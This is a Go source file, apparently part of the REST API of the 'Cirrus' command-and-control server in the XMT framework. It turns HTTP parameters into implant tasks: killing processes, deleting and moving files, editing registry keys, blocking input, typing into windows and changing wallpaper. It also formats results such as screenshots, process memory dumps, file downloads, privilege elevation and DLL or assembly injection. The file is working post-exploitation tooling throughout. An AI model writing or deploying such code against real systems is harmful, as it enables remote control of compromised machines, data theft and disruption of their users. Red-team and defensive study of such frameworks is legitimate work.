// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cirrus

import (
	"context"
	"encoding/base64"
	"io"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/PurpleSec/escape"
	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/c2/task/result"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const negOne = ^uint64(0)

var (
	errInvalidPID      = xerr.New(`specify a valid "pid" value`)
	errInvalidType     = xerr.New("invalid type")
	errInvalidPath     = xerr.New(`specify a non-empty "path" value`)
	errInvalidName     = xerr.New(`specify a non-empty "name" value`)
	errInvalidDest     = xerr.New(`specify a non-empty "dest" value`)
	errInvalidTitle    = xerr.New(`specify a non-empty "title" value`)
	errInvalidAction   = xerr.New("invalid action")
	errInvalidScript   = xerr.New("script data inside script")
	errInvalidHandle   = xerr.New(`specify a valid "handle" value`)
	errInvalidSource   = xerr.New(`specify a non-empty "source" value`)
	errInvalidDuration = xerr.New(`specify a greater than zero "seconds" value`)
)

func isTrue(s string) bool {
	if len(s) == 0 {
		return true
	}
	switch s[0] {
	case 't', 'T', 'e', 'E', 'y', 'Y', '1':
		return true
	}
	return false
}
func isValidName(s string) bool {
	if len(s) == 0 {
		return true
	}
	for i := range s {
		switch {
		case s[i] <= 57 && s[i] >= 48:
		case s[i] <= 90 && s[i] >= 65:
		case s[i] <= 122 && s[i] >= 97:
		case s[i] == 45 || s[i] == 46 || s[i] == 95:
		default:
			return false
		}
	}
	return true
}
func writeBase64(w io.Writer, b []byte) {
	d := base64.NewEncoder(base64.StdEncoding, w)
	d.Write(b)
	d.Close()
}
func parseJitter(s string) (int, error) {
	if i := len(s) - 1; s[i] == '%' {
		s = s[:i]
	}
	if len(s) == 0 {
		return 0, errInvalidJitter
	}
	j, err := strconv.ParseUint(s, 10, 8)
	if err != nil {
		return 0, errInvalidJitter
	}
	if j > 100 {
		return 0, errInvalidJitter
	}
	return int(j), nil
}
func readEmptyB64(s string) ([]byte, error) {
	if len(s) == 0 {
		return nil, nil
	}
	b, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return nil, errInvalidB64
	}
	return b, nil
}
func parseDuration(s string) (time.Duration, error) {
	if len(s) == 0 {
		return 0, errInvalidSleep
	}
	v := strings.ToLower(s)
	switch v[len(v)-1] {
	case 's', 'h', 'm':
	default:
		v += "s"
	}
	d, err := time.ParseDuration(v)
	if err != nil {
		return 0, errInvalidSleep
	}
	if d < time.Second || d > time.Hour*24 {
		return 0, errInvalidSleep
	}
	return d, nil
}
func parseSleep(s string) (time.Duration, int, error) {
	if i := strings.IndexByte(s, '/'); i > 0 {
		var (
			b, a   = strings.TrimSpace(s[:i]), strings.TrimSpace(s[i+1:])
			d, err = parseDuration(b)
		)
		if err != nil {
			return 0, 0, errInvalidSleep
		}
		j, err := parseJitter(a)
		if err != nil {
			return 0, 0, errInvalidJitter
		}
		return d, j, nil
	}
	d, err := parseDuration(strings.TrimSpace(s))
	return d, -1, err
}
func (c *Cirrus) context(_ net.Listener) context.Context {
	return c.ctx
}
func writeJobJSON(z bool, t uint8, j *com.Packet, w io.Writer) error {
	if err := writeJobJSONSimple(z, t, j, w); err != io.ErrClosedPipe {
		return err
	}
	o := base64.NewEncoder(base64.StdEncoding, w)
	switch w.Write([]byte(`{"type":"`)); t {
	case task.TvDownload:
		p, d, n, r, err := result.Download(j)
		if err != nil {
			return err
		}
		w.Write([]byte(
			`download","path":` + escape.JSON(p) +
				`,"size":` + strconv.FormatUint(n, 10) +
				`,"dir":` + strconv.FormatBool(d) + `,"data":"`,
		))
		io.Copy(o, r)
	case task.TvScreenShot, task.TvProcDump:
		r, err := result.ProcessDump(j)
		if err != nil {
			return err
		}
		if t == task.TvProcDump {
			w.Write([]byte(`dump",`))
		} else {
			w.Write([]byte(`shot",`))
		}
		w.Write([]byte(`"data":"`))
		io.Copy(o, r)
	case task.TvExecute, task.TvZombie, task.TvPullExecute:
		p, c, r, err := result.Process(j)
		if err != nil {
			return err
		}
		w.Write([]byte(
			`execute", "pid":` + strconv.FormatUint(uint64(p), 10) +
				`,"exit":` + strconv.Itoa(int(c)) + `,"data":"`),
		)
		io.Copy(o, r)
	default:
		w.Write([]byte(`unknown","data":"`))
		io.Copy(o, j)
	}
	o.Close()
	w.Write([]byte{'"', '}'})
	o = nil
	return nil
}
func ioPacket(c routex.Content, a string) (*com.Packet, string, error) {
	switch strings.ToLower(a) {
	case "kill":
		if i := c.UintDefault("pid", 0); i > 0 {
			return task.Kill(uint32(i)), "kill " + strconv.FormatUint(i, 10), nil
		}
		return nil, "", errInvalidPID
	case "touch":
		if s := c.StringDefault("path", ""); len(s) > 0 {
			return task.Touch(s), "touch " + s, nil
		}
		return nil, "", errInvalidPath
	case "delete":
		if s := c.StringDefault("path", ""); len(s) > 0 {
			return task.Delete(s, c.BoolDefault("force", false)), "delete " + s, nil
		}
		return nil, "", errInvalidPath
	case "kill_name":
		if s := c.StringDefault("name", ""); len(s) > 0 {
			return task.KillName(s), "kill_name " + s, nil
		}
		return nil, "", errInvalidName
	case "move", "copy":
		var (
			d = c.StringDefault("dest", "")
			s = c.StringDefault("source", "")
		)
		if len(s) == 0 {
			return nil, "", errInvalidSource
		}
		if len(d) == 0 {
			return nil, "", errInvalidDest
		}
		if a[0] == 'm' || a[0] == 'M' {
			return task.Move(s, d), "move " + s + " " + d, nil
		}
		return task.Copy(s, d), "copy " + s + " " + d, nil
	}
	return nil, "", errInvalidAction
}
func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
	switch h := c.UintDefault("handle", 0); strings.ToLower(a) {
	case "wtf":
		if d := c.UintDefault("seconds", 30); d > 0 {
			return task.WindowWTF(time.Duration(d) * time.Second), "window wtfmode", nil
		}
		return nil, "", errInvalidDuration
	case "ls", "get":
		return task.WindowList(), "window list", nil
	case "wallpaper":
		if s := c.StringDefault("path", ""); len(s) > 0 {
			return task.Wallpaper(s), "wallpaper " + s, nil
		}
		if d := c.StringDefault("data", ""); len(d) > 0 {
			b, err := readEmptyB64(d)
			if err != nil {
				return nil, "", err
			}
			return task.WallpaperBytes(b), "wallpaper <raw>", nil
		}
		return nil, "", errInvalidDataPath
	case "cl", "close":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		return task.WindowClose(h), "window " + strconv.FormatUint(h, 16) + " close", nil
	case "fg", "focus":
		if h == 0 || h == negOne {
			return nil, "", errInvalidHandle
		}
		return task.WindowFocus(h), "window " + strconv.FormatUint(h, 16) + " focus", nil
	case "sw", "show":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		var n uint8
		if v, err := c.String("state"); err == nil {
			if len(v) == 0 {
				n = 5
			} else {
				switch strings.ToLower(v) {
				case "hide":
					n = 0
				case "show":
					n = 5
				case "normal":
					n = 1
				case "restore":
					n = 9
				case "min", "minimize":
					n = 6
				case "max", "maximize":
					n = 3
				default:
					n = 10
				}
			}
		} else {
			i := c.UintDefault("state", 0)
			if i > 11 {
				n = 11
			} else {
				n = uint8(i)
			}
		}
		return task.WindowShow(h, n), "window " + strconv.FormatUint(h, 16) + " show " + strconv.FormatUint(uint64(n), 10), nil
	case "tr", "trans", "transparent":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		n := c.UintDefault("level", 0)
		if n > 255 {
			n = 255
		}
		return task.WindowTransparency(h, uint8(n)), "window " + strconv.FormatUint(h, 16) + " transparency " +
			strconv.FormatUint(n, 10), nil
	case "dis", "en", "disable", "enable":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		if a[0] == 'E' || a[0] == 'e' {
			return task.WindowEnable(h, true), "window " + strconv.FormatUint(h, 16) + " enable", nil
		}
		return task.WindowEnable(h, false), "window " + strconv.FormatUint(h, 16) + " disable", nil
	case "mv", "pos", "move", "size", "resize":
		if h == 0 || h == negOne {
			return nil, "", errInvalidHandle
		}
		x, y, w, v := int32(-1), int32(-1), int32(-1), int32(-1)
		if n, err := c.Int("x"); err == nil {
			x = int32(n)
		}
		if n, err := c.Int("y"); err == nil {
			y = int32(n)
		}
		if n, err := c.Int("width"); err == nil {
			w = int32(n)
		}
		if n, err := c.Int("height"); err == nil {
			v = int32(n)
		}
		return task.WindowMove(h, x, y, w, v), "window " + strconv.FormatUint(h, 16) + " move " +
			strconv.FormatInt(int64(x), 10) + " " + strconv.FormatInt(int64(y), 10) + " " + strconv.FormatInt(int64(w), 10) + " " +
			strconv.FormatInt(int64(v), 10), nil
	case "in", "send", "type", "text", "input":
		if h == negOne {
			return nil, "", errInvalidHandle
		}
		return task.WindowSendInput(h, c.StringDefault("text", "")), "window " + strconv.FormatUint(h, 16) + " sendinput", nil
	case "mb", "msg", "msgbox", "message", "messagebox":
		var (
			f = c.UintDefault("flags", 0)
			d = c.StringDefault("text", "")
			t = c.StringDefault("title", "")
		)
		if len(t) == 0 {
			return nil, "", errInvalidTitle
		}
		m := "window msgbox " + strconv.FormatUint(h, 16)
		if len(t) > 0 {
			m += " " + t
		}
		return task.WindowMessageBox(h, t, d, uint32(f)), m, nil
	case "bi", "sm", "hc", "block_input", "swap_mouse", "high_contrast":
		switch e := c.BoolDefault("enable", false); a[0] {
		case 'B', 'b':
			return task.BlockInput(e), "block input " + strconv.FormatBool(e), nil
		case 'H', 'h':
			return task.HighContrast(e), "high contrast " + strconv.FormatBool(e), nil
		case 'S', 's':
			return task.SwapMouse(e), "swap mouse" + strconv.FormatBool(e), nil
		}
	}
	return nil, "", errInvalidAction
}
func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
	switch t {
	case task.TvUI:
		w.Write([]byte(`{"type":"ui"}`))
	case task.MvCwd:
		w.Write([]byte(`{"type":"cd"}`))
	case task.MvPwd:
		d, err := result.Pwd(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"pwd","path":` + escape.JSON(d) + `}`))
	case task.MvList:
		f, err := result.Ls(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"list","entries":[`)); len(f) > 0 {
			for i := range f {
				if i > 0 {
					w.Write([]byte(","))
				}
				w.Write([]byte(
					`{"name":` + escape.JSON(f[i].Name()) +
						`,"mode":` + strconv.FormatUint(uint64(f[i].Mode()), 10) +
						`,"mode_str":"` + f[i].Mode().String() +
						`","size":` + strconv.FormatUint(uint64(f[i].Size()), 10) +
						`,"modtime":"` + f[i].ModTime().Format(time.RFC3339) + `"}`,
				))
			}
		}
		w.Write([]byte("]}"))
	case task.TvWait:
		w.Write([]byte(`{"type":"wait"}`))
	case task.MvTime:
		w.Write([]byte(`{"type":"time"}`))
	case task.TvTroll:
		w.Write([]byte(`{"type":"troll"}`))
	case task.MvProxy:
		w.Write([]byte(`{"type":"proxy"}`))
	case task.MvSpawn:
		p, err := result.Spawn(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"spawn","pid"` + strconv.FormatUint(uint64(p), 10) + `}`))
	case task.MvScript:
		if z {
			return errInvalidScript
		}
		v, err := result.Script(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"script", "count":` + strconv.FormatUint(uint64(len(v)), 10) + `, "entries": [`))
		for i := range v {
			if i > 0 {
				w.Write([]byte{','})
			}
			if v[i].Flags&com.FlagError != 0 {
				m, err := v[i].StringVal()
				if err != nil {
					return err
				}
				w.Write([]byte(`{"type":"error","error":` + escape.JSON(m) + `}`))
				continue
			}
			if v[i].Empty() {
				w.Write([]byte(`{"type":"empty"}`))
				continue
			}
			if err := writeJobJSON(true, v[i].ID, v[i], w); err != nil && err != io.ErrClosedPipe {
				return err
			}
		}
		w.Write([]byte{']', '}'})
	case task.TvRename:
		w.Write([]byte(`{"type":"rename"}`))
	case task.MvMounts:
		m, err := result.Mounts(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"mounts","entries":[`)); len(m) > 0 {
			for i := range m {
				if i > 0 {
					w.Write([]byte{','})
				}
				w.Write([]byte(escape.JSON(m[i])))
			}
		}
		w.Write([]byte{']', '}'})
	case task.MvRefresh:
		w.Write([]byte(`{"type":"refresh"}`))
	case task.MvMigrate:
		w.Write([]byte(`{"type":"migrate"}`))
	case task.TvElevate:
		w.Write([]byte(`{"type":"elevate"}`))
	case task.TvRevSelf:
		w.Write([]byte(`{"type":"rev2self"}`))
	case task.MvProfile:
		w.Write([]byte(`{"type":"profile"}`))
	case task.TvUnTrust:
		w.Write([]byte(`{"type":"untrust"}`))
	case task.TvCheckDLL:
		if r, _ := result.CheckDLL(j); r {
			w.Write([]byte(`{"type":"check_dll","tainted":false}`))
		} else {
			w.Write([]byte(`{"type":"check_dll","tainted":true}`))
		}
	case task.MvProcList:
		p, err := result.ProcessList(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"processes","entries":[`)); len(p) > 0 {
			for i := range p {
				if i > 0 {
					w.Write([]byte{','})
				}
				w.Write([]byte(
					`{"name":` + escape.JSON(p[i].Name) +
						`,"user":` + escape.JSON(p[i].User) +
						`,"pid":` + strconv.FormatUint(uint64(p[i].PID), 10) +
						`,"ppid":` + strconv.FormatUint(uint64(p[i].PPID), 10) + `}`,
				))
			}
		}
		w.Write([]byte{']', '}'})
	case task.TvRegistry:
		e, v, err := result.Registry(j)
		if err != nil {
			return err
		}
		if !v {
			w.Write([]byte(`{"type":"registry", "status":false}`))
			return nil
		}
		if len(e) == 0 {
			w.Write([]byte(`{"type":"registry", "status":true}`))
			return nil
		}
		w.Write([]byte(`{"type":"registry","entries":[`))
		for i := range e {
			if i > 0 {
				w.Write([]byte{','})
			}
			w.Write([]byte(
				`{"name":` + escape.JSON(e[i].Name) +
					`,"type":` + escape.JSON(e[i].TypeName()) +
					`,"value":` + escape.JSON(e[i].String()) +
					`,"data":"` + base64.StdEncoding.EncodeToString(e[i].Data) + `"}`,
			))
		}
		w.Write([]byte{']', '}'})
	case task.TvSystemIO:
		p, s, r, err := result.SystemIO(j)
		if err != nil {
			return err
		}
		if !r {
			w.Write([]byte(`{"type":"system_io", "status":false}`))
			return nil
		}
		if len(p) == 0 && s == 0 {
			w.Write([]byte(`{"type":"system_io", "status":true}`))
			return nil
		}
		w.Write([]byte(`{"type":"system_io","path":` + escape.JSON(p) + `,"size":` + strconv.FormatUint(s, 10) + `}`))
	case task.TvReloadDLL:
		w.Write([]byte(`{"type":"reload_dll"}`))
	case task.TvZeroTrace:
		w.Write([]byte(`{"type":"zerotrace"}`))
	case task.TvLoginUser:
		w.Write([]byte(`{"type":"login_user"}`))
	case task.MvCheckDebug:
		if r, _ := result.IsDebugged(j); r {
			w.Write([]byte(`{"type":"check_debug","debug":true}`))
		} else {
			w.Write([]byte(`{"type":"check_debug","debug":false}`))
		}
	case task.TvWindowList:
		e, err := result.WindowList(j)
		if err != nil {
			return err
		}
		if w.Write([]byte(`{"type":"window_list","entries":[`)); len(e) > 0 {
			for i := range e {
				if i > 0 {
					w.Write([]byte{','})
				}
				w.Write([]byte(
					`{"name":` + escape.JSON(e[i].Name) +
						`,"handle":` + strconv.FormatUint(uint64(e[i].Handle), 10) +
						`,"minimized":` + strconv.FormatBool(e[i].IsMinimized()) +
						`,"maximized":` + strconv.FormatBool(e[i].IsMaximized()) +
						`,"x":` + strconv.FormatInt(int64(e[i].X), 10) +
						`,"y":` + strconv.FormatInt(int64(e[i].Y), 10) +
						`,"width":` + strconv.FormatInt(int64(e[i].Width), 10) +
						`,"height":` + strconv.FormatInt(int64(e[i].Height), 10) + `}`,
				))
			}
		}
		w.Write([]byte{']', '}'})
	case task.TvUpload, task.TvPull:
		p, n, err := result.Upload(j)
		if err != nil {
			return err
		}
		w.Write([]byte(`{"type":"upload","size":` + strconv.FormatUint(n, 10) + `,"path":` + escape.JSON(p) + `}`))
	case task.TvAssembly, task.TvDLL:
		h, p, c, err := result.Assembly(j)
		if err != nil {
			return err
		}
		if t == task.TvDLL {
			w.Write([]byte(`{"type":"dll",`))
		} else {
			w.Write([]byte(`{"type":"assembly",`))
		}
		w.Write([]byte(
			`"handle":` + strconv.FormatUint(uint64(h), 10) +
				`,"exit":` + strconv.FormatUint(uint64(c), 10) +
				`,"pid":` + strconv.FormatUint(uint64(p), 10) + `}`,
		))
	default:
		return io.ErrClosedPipe
	}
	return nil
}
func writeError(c int, e string, w http.ResponseWriter, _ *routex.Request) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.WriteHeader(c)
	w.Write([]byte(`{"source": "xmt_rest", "code": ` + strconv.Itoa(c) + `, "error": `))
	if len(e) > 0 {
		w.Write([]byte(escape.JSON(e)))
	} else {
		w.Write([]byte(http.StatusText(c)))
	}
	w.Write([]byte{'}'})
}
func registryPacket(c routex.Content, a, k, v string) (*com.Packet, error) {
	switch strings.ToLower(a) {
	case "get":
		return task.RegGet(k, v), nil
	case "ls", "dir":
		return task.RegLs(k), nil
	case "del", "delete", "rm", "rem", "remove":
		if len(v) == 0 {
			return task.RegDeleteKey(k, c.BoolDefault("force", false)), nil
		}
		return task.RegDelete(k, v, c.BoolDefault("force", false)), nil
	case "set", "edit", "update":
		switch strings.ToLower(c.StringDefault("type", "")) {
		case "sz", "string":
			return task.RegSetString(k, v, c.StringDefault("data", "")), nil
		case "bin", "binary":
			b, err := readEmptyB64(c.StringDefault("data", ""))
			if err != nil {
				return nil, err
			}
			return task.RegSetBytes(k, v, b), nil
		case "uint32", "dword":
			if i, ok := c.Uint("data"); ok == nil {
				return task.RegSetDword(k, v, uint32(i)), nil
			}
			i, err := strconv.ParseInt(c.StringDefault("data", ""), 0, 32)
			if err != nil {
				return nil, err
			}
			return task.RegSetDword(k, v, uint32(i)), nil
		case "uint64", "qword":
			if i, ok := c.Uint("data"); ok == nil {
				return task.RegSetQword(k, v, uint64(i)), nil
			}
			i, err := strconv.ParseInt(c.StringDefault("data", ""), 0, 64)
			if err != nil {
				return nil, err
			}
			return task.RegSetQword(k, v, uint64(i)), nil
		case "multi", "multi_sz":
			return task.RegSetStringList(k, v, strings.Split(c.StringDefault("data", ""), "\n")), nil
		case "exp_sz", "expand_string":
			return task.RegSetExpandString(k, v, c.StringDefault("data", "")), nil
		default:
			return nil, errInvalidType
		}
	}
	return nil, errInvalidAction
}
func encoding(_ context.Context, w http.ResponseWriter, _ *routex.Request) bool {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	return true
}
func (c *Cirrus) auth(_ context.Context, w http.ResponseWriter, r *routex.Request) bool {
	if len(c.Auth) == 0 {
		return true
	}
	if !strings.EqualFold(r.Header.Get("X-CirrusAuth"), c.Auth) {
		w.WriteHeader(http.StatusUnauthorized)
		return false
	}
	return true
}
func (c *Cirrus) websocket(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	s, err := c.ws.Upgrade(w, r.Request, nil)
	if err != nil {
		writeError(http.StatusInternalServerError, err.Error(), w, r)
		return
	}
	c.events.subscribe(s)
}
